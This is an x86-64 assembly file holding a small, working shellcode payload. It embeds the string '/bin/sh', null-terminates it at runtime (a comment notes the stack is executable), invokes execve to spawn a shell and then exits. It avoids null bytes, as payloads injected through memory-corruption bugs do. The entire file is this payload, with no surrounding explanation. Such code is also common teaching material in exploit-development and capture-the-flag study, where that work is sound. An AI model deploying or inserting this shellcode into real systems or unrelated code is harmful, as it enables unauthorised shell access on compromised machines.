.global _start

.text
_start:
    jmp next
sh:
    .ascii "/bin/sh"
eol:
    .byte 0xff
next:
    xorl %eax, %eax
    # stack is executable, i can do this
    movb %al, eol(%rip)
    leaq sh(%rip), %rdi
    # sys_execve
    movb $59, %al
    xorl %edx, %edx
    xorl %esi, %esi
    syscall

    # sys_exit
    xorl %eax, %eax
    movb $60, %al
    xorl %edi, %edi
    syscall
